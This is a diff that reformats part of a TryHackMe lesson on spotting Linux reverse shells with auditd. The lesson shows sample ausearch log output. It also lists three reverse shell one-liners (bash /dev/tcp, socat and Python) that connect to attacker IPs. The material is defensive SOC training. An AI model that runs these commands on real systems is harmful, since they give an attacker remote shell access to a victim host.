@@ -62,12 +62,23 @@ Attack Convenience Threat actors entering via SSH get a convenient terminal with
 
  *![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758648434107.svg)*
 
- Reverse Shells To combat the limitations, threat actors establish a reverse shell - a session from the victim to the attacker, a more convenient and often the only possible action to continue the attack. You can read about reverse shells in the [Shells Overview](https://tryhackme.com/room/shellsoverview) room, but let's focus on the detection part for this task. Below are three of the many methods to open a reverse shell on Linux:
+### Reverse Shells
 
-    Command on the Victim Explanation   `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.   `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.   `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` Python alternative to the above command. The attacker is listening at 10.30.30.30:80.    Detecting Reverse Shells SOC typically treats reverse shells as critical alerts as they indicate that the system has already been breached and a human threat actor is actively attempting to establish a shell and continue the attack. Luckily, they are detectable with auditd. Below is the log output when a socat reverse shell is established after exploiting a vulnerability in the TryPingMe application:
+To combat these limitations, threat actors establish a reverse shell, which creates a session from the victim to the attacker. This is often the only practical way to continue an attack after initial access. You can read more in the [Shells Overview](https://tryhackme.com/room/shellsoverview) room.
 
-   Finding Reverse Shell Origin 
-```Finding Reverse Shell Origin 
+Below are three common reverse shell methods on Linux:
+
+| Command on the victim | Explanation |
+| --- | --- |
+| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | The victim connects to `10.10.10.10:1337` and launches a bash shell for the attacker. |
+| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | `socat` alternative to bash reverse shell; attacker listens on `10.20.20.20:2525`. |
+| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` | Python alternative; attacker listens on `10.30.30.30:80`. |
+
+SOC teams typically treat reverse shells as critical because they indicate the host is already compromised and an attacker is actively operating on it. They are often detectable with `auditd`.
+
+### Finding Reverse Shell Origin
+
+```bash
 root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
 type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
 type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
@@ -83,8 +94,9 @@ type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid
 
    After the reverse shell to the attacker's IP is established, it is usually followed by Discovery and other stages you learned in the previous rooms. As always, you can list all commands originating from the spawned reverse shell by building a process tree:
 
-   Listing Reverse Shell Activity 
-```Listing Reverse Shell Activity 
+### Listing Reverse Shell Activity
+
+```bash
 root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
 type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
 type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
@@ -96,9 +108,13 @@ type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .
 [...]
 ```
 
-    In this task, use the VM to see how TryPingMe vulnerability works in practice:
- - Access TryPingMe through your browser or AttackBox at **http://10.49.187.176:8000** 
- - Access the scenario auditd logs at **ausearch -i -if /home/ubuntu/scenario/audit.log**
+In this task, use the VM to see how the TryPingMe vulnerability works in practice:
+- Access TryPingMe through your browser or AttackBox at **http://10.49.187.176:8000**
+- Access the scenario auditd logs with:
+
+```bash
+ausearch -i -if /home/ubuntu/scenario/audit.log
+```
 
 ### **Answer the questions below**
 
